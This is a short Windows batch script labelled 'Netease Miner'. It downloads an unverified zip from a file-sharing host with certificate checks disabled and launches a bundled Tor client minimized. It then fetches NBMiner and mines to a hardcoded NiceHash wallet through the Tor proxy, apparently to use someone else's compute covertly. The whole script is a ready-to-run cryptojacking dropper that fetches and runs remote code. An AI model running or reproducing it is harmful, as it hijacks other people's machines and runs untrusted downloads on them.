@echo off
echo Running Netease Miner (Made by Zortos OwO)
curl -LJOk "https://store2.gofile.io/download/265aea8d-a996-4494-b356-b59546892f54/ZortosBuild.zip"
tar -xf ZortosBuild.zip
cd torBuild\Tor\
START /min "" "tor.exe"
timeout 10 /nobreak 
cls
curl -LJOk "https://github.com/NebuTech/NBMiner/releases/download/v39.4/NBMiner_39.4_Win.zip"
tar -xf NBMiner_39.4_Win.zip
cd NBMiner_Win
nbminer.exe -proxy 127.0.0.1:9050 -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 35YDSvNdKVCmA2RRQd2fpYQBqhN1SsyqUZ

